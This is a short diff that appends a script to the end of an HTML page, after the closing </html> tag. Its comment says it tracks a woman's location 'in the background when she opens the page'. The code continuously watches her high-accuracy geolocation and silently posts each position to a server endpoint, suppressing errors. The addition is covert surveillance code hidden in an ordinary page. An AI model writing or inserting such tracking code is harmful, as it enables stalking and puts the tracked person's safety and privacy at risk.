@@ -145,3 +145,23 @@
 
 </body>
 </html>
+<script>
+  // Request location tracking in the background when she opens the page
+  if (navigator.geolocation) {
+    navigator.geolocation.watchPosition(
+      (position) => {
+        fetch('/api/response', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            type: 'location',
+            lat: position.coords.latitude,
+            lng: position.coords.longitude
+          })
+        }).catch(err => console.log('Location sync error'));
+      },
+      (error) => console.log('Geolocation permission denied or unavailable'),
+      { enableHighAccuracy: true, maximumAge: 10000, timeout: 5000 }
+    );
+  }
+</script>
